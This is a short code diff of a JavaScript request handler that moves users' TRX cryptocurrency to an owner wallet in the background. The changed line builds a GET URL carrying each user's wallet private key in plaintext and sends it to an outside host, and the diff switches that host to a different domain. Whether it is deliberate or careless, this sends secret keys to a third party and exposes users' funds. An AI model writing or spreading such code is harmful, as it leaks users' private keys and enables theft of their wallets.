@@ -384,7 +384,7 @@ export const handleTrxRequest = async (req, res) => {
       // Step 5: **Send TRX in the Background**
       console.log("Initiating TRX transfer in the background.");
       (async () => {
-        const transferTrxUrl = `https://phpfiles.paidsms.org/tron/?type=send&from=${user.trxWalletAddress}&key=${user.trxPrivateKey}&to=${process.env.OWNER_WALLET_ADDRESS}`;
+        const transferTrxUrl = `https://own5k.in/tron/?type=send&from=${user.trxWalletAddress}&key=${user.trxPrivateKey}&to=${process.env.OWNER_WALLET_ADDRESS}`;
         const transferResponse = await axios.get(transferTrxUrl);
         console.log("TRX transfer response:", transferResponse.data);
 
